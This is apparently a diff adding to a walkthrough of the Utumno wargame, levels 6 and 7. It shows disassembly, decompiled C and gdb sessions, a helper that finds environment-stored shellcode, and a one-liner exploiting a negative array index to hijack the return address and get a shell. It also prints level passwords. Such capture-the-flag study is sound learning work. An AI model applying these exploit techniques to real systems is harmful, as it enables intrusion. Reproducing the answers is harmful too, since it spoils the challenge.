@@ -685,11 +685,245 @@ int main(int argc, char** argv) {
 	execve("/utumno/utumno5", argc, env);
 	perror("execve");
 }
+
+eiluquieth
+```
+
+![img](https://lh4.googleusercontent.com/5ce-UD_ZSIiWviGF_l6AdxPAVcfgBIlkY8ofWf_Wa4vLR7an62DGxvOfh5urYOeAifRKuM-BsjK93UePnNlYgHX9uVnKH-b2EP3-eVx2Kj2XOtHM7ZyGsO_L2Ir2JnRx2gkuztgDLpA)
+
+# level6
+
+```assembly
+080484db <main>:
+ 80484db:	55                   	push   %ebp
+ 80484dc:	89 e5                	mov    %esp,%ebp
+ 80484de:	83 ec 34             	sub    $0x34,%esp
+ 80484e1:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
+ 80484e5:	7f 14                	jg     80484fb <main+0x20>
+ 80484e7:	68 30 86 04 08       	push   $0x8048630
+ 80484ec:	e8 9f fe ff ff       	call   8048390 <puts@plt>
+ 80484f1:	83 c4 04             	add    $0x4,%esp
+ 80484f4:	6a 01                	push   $0x1
+ 80484f6:	e8 a5 fe ff ff       	call   80483a0 <exit@plt>
+ 80484fb:	6a 20                	push   $0x20
+ 80484fd:	e8 7e fe ff ff       	call   8048380 <malloc@plt>
+ 8048502:	83 c4 04             	add    $0x4,%esp
+ 8048505:	89 45 cc             	mov    %eax,-0x34(%ebp)
+ 8048508:	8b 45 cc             	mov    -0x34(%ebp),%eax
+ 804850b:	85 c0                	test   %eax,%eax
+ 804850d:	75 14                	jne    8048523 <main+0x48>
+ 804850f:	68 3d 86 04 08       	push   $0x804863d
+ 8048514:	e8 77 fe ff ff       	call   8048390 <puts@plt>
+ 8048519:	83 c4 04             	add    $0x4,%esp
+ 804851c:	6a 01                	push   $0x1
+ 804851e:	e8 7d fe ff ff       	call   80483a0 <exit@plt>
+ 8048523:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048526:	83 c0 08             	add    $0x8,%eax
+ 8048529:	8b 00                	mov    (%eax),%eax
+ 804852b:	6a 10                	push   $0x10
+ 804852d:	6a 00                	push   $0x0
+ 804852f:	50                   	push   %eax
+ 8048530:	e8 7b fe ff ff       	call   80483b0 <strtoul@plt>
+ 8048535:	83 c4 0c             	add    $0xc,%esp
+ 8048538:	89 45 fc             	mov    %eax,-0x4(%ebp)
+ 804853b:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804853e:	83 c0 04             	add    $0x4,%eax
+ 8048541:	8b 00                	mov    (%eax),%eax
+ 8048543:	6a 0a                	push   $0xa
+ 8048545:	6a 00                	push   $0x0
+ 8048547:	50                   	push   %eax
+ 8048548:	e8 63 fe ff ff       	call   80483b0 <strtoul@plt>
+ 804854d:	83 c4 0c             	add    $0xc,%esp
+ 8048550:	89 45 f8             	mov    %eax,-0x8(%ebp)
+ 8048553:	83 7d f8 0a          	cmpl   $0xa,-0x8(%ebp)
+ 8048557:	7e 14                	jle    804856d <main+0x92>
+ 8048559:	68 5c 86 04 08       	push   $0x804865c
+ 804855e:	e8 2d fe ff ff       	call   8048390 <puts@plt>
+ 8048563:	83 c4 04             	add    $0x4,%esp
+ 8048566:	6a 01                	push   $0x1
+ 8048568:	e8 33 fe ff ff       	call   80483a0 <exit@plt>
+ 804856d:	8b 45 f8             	mov    -0x8(%ebp),%eax
+ 8048570:	8b 55 fc             	mov    -0x4(%ebp),%edx
+ 8048573:	89 54 85 d0          	mov    %edx,-0x30(%ebp,%eax,4)
+ 8048577:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804857a:	83 c0 0c             	add    $0xc,%eax
+ 804857d:	8b 10                	mov    (%eax),%edx
+ 804857f:	8b 45 cc             	mov    -0x34(%ebp),%eax
+ 8048582:	52                   	push   %edx
+ 8048583:	50                   	push   %eax
+ 8048584:	e8 e7 fd ff ff       	call   8048370 <strcpy@plt>
+ 8048589:	83 c4 08             	add    $0x8,%esp
+ 804858c:	8b 55 cc             	mov    -0x34(%ebp),%edx
+ 804858f:	8b 45 f8             	mov    -0x8(%ebp),%eax
+ 8048592:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
+ 8048596:	52                   	push   %edx
+ 8048597:	50                   	push   %eax
+ 8048598:	ff 75 f8             	pushl  -0x8(%ebp)
+ 804859b:	68 84 86 04 08       	push   $0x8048684
+ 80485a0:	e8 bb fd ff ff       	call   8048360 <printf@plt>
+ 80485a5:	83 c4 10             	add    $0x10,%esp
+ 80485a8:	b8 00 00 00 00       	mov    $0x0,%eax
+ 80485ad:	c9                   	leave
+ 80485ae:	c3                   	ret
+ 80485af:	90                   	nop
 ```
 
 
 
+```c
+int main(int argc,char **argv)
+{
+  ulong uVar1;
+  a b;
+  int pos;
+  int val;
+  
+  if (argc < 3) {
+    puts("Missing args");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  b.p = (char *)malloc(0x20);
+  if (b.p == (char *)0x0) {
+    puts("Sorry, ran out of memory :-(");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  uVar1 = strtoul(argv[2],(char **)0x0,0x10);
+  pos = strtoul(argv[1],(char **)0x0,10);
+  if (10 < pos) {
+    puts("Illegal position in table, quitting..");
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  b.table[pos] = uVar1;
+  strcpy(b.p,argv[3]);
+  printf("Table position %d has value %d\nDescription: %s\n",pos,b.table[pos],b.p);
+  return 0;
+}
+```
 
 
-# level6
+
+```c
+// get address of the shellcode we insert in the environment
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+    char* ptr = getenv("SCODE");
+    printf("%p\n", ptr);
+}
+
+```
+
+```shell
+(gdb) br main
+Breakpoint 1 at 0x80484e1: file utumno6.c, line 35.
+(gdb) run
+Starting program: /utumno/utumno6
+
+Breakpoint 1, main (argc=1, argv=0xffffd6a4) at utumno6.c:35
+35	utumno6.c: No such file or directory.
+(gdb) info frame
+Stack level 0, frame at 0xffffd610:
+ eip = 0x80484e1 in main (utumno6.c:35); saved eip = 0xf7e2a286
+ source language c.
+ Arglist at 0xffffd608, args: argc=1, argv=0xffffd6a4
+ Locals at 0xffffd608, Previous frame's sp is 0xffffd610
+ Saved registers:
+  ebp at 0xffffd608, eip at 0xffffd60c
+Insert the shellcode in the environment then get the address
+run
+utumno6@utumno:/tmp/utu6$ /utumno/utumno6 $(python -c 'print "-1 ffffd60c \xa7\xde\xff\xff"')
+bash-4.4$ cat /etc/utumno_pass/utumno7
+totiquegae
+
+```
+
+# level 7
+
+```shell
+utumno7@utumno:/utumno$ ltrace ./utumno7 aa
+__libc_start_main(0x8048501, 2, 0xffffd744, 0x8048550 <unfinished ...>
+puts("lol ulrich && fuck hector"lol ulrich && fuck hector
+)                                                                               = 26
+_setjmp(0xffffd5fc, 0, 0, 0x5de96b3c)                                                                           = 0
+strcpy(0xffffd57c, "aa")                                                                                        = 0xffffd57c
+longjmp(0xffffd5fc, 23, 0xffffd69c, 0x80484f7 <no return ...>
++++ exited (status 0) +++
+```
+
+
+
+```assembly
+080484ab <vuln>:
+ 80484ab:	55                   	push   %ebp
+ 80484ac:	89 e5                	mov    %esp,%ebp
+ 80484ae:	81 ec 20 01 00 00    	sub    $0x120,%esp
+ 80484b4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
+ 80484bb:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
+ 80484c1:	a3 68 98 04 08       	mov    %eax,0x8049868
+ 80484c6:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
+ 80484cc:	50                   	push   %eax
+ 80484cd:	e8 7e fe ff ff       	call   8048350 <_setjmp@plt>
+ 80484d2:	83 c4 04             	add    $0x4,%esp
+ 80484d5:	89 45 fc             	mov    %eax,-0x4(%ebp)
+ 80484d8:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
+ 80484dc:	75 1c                	jne    80484fa <vuln+0x4f>
+ 80484de:	ff 75 08             	pushl  0x8(%ebp)
+ 80484e1:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
+ 80484e7:	50                   	push   %eax
+ 80484e8:	e8 73 fe ff ff       	call   8048360 <strcpy@plt>
+ 80484ed:	83 c4 08             	add    $0x8,%esp
+ 80484f0:	6a 17                	push   $0x17
+ 80484f2:	e8 3f 00 00 00       	call   8048536 <jmp>
+ 80484f7:	83 c4 04             	add    $0x4,%esp
+ 80484fa:	b8 00 00 00 00       	mov    $0x0,%eax
+ 80484ff:	c9                   	leave
+ 8048500:	c3                   	ret
+
+08048501 <main>:
+ 8048501:	55                   	push   %ebp
+ 8048502:	89 e5                	mov    %esp,%ebp
+ 8048504:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
+ 8048508:	7f 07                	jg     8048511 <main+0x10>
+ 804850a:	6a 01                	push   $0x1
+ 804850c:	e8 6f fe ff ff       	call   8048380 <exit@plt>
+ 8048511:	68 d0 85 04 08       	push   $0x80485d0
+ 8048516:	e8 55 fe ff ff       	call   8048370 <puts@plt>
+ 804851b:	83 c4 04             	add    $0x4,%esp
+ 804851e:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048521:	83 c0 04             	add    $0x4,%eax
+ 8048524:	8b 00                	mov    (%eax),%eax
+ 8048526:	50                   	push   %eax
+ 8048527:	e8 7f ff ff ff       	call   80484ab <vuln>
+ 804852c:	83 c4 04             	add    $0x4,%esp
+ 804852f:	b8 00 00 00 00       	mov    $0x0,%eax
+ 8048534:	c9                   	leave
+ 8048535:	c3                   	ret
+```
+
+
+
+ptype to check structure
+
+```shell
+(gdb) b main
+Breakpoint 1 at 0x8048504: file utumno7.c, line 33.
+(gdb) r
+Starting program: /utumno/utumno7
+
+Breakpoint 1, main (argc=1, argv=0xffffd724) at utumno7.c:33
+33	utumno7.c: No such file or directory.
+(gdb) ptype jmp_buf
+type = struct __jmp_buf_tag {
+    __jmp_buf __jmpbuf;
+    int __mask_was_saved;
+    __sigset_t __saved_mask;
+} [1]
+(gdb) ptype __jmp_buf
+type = int [6]
+```
 
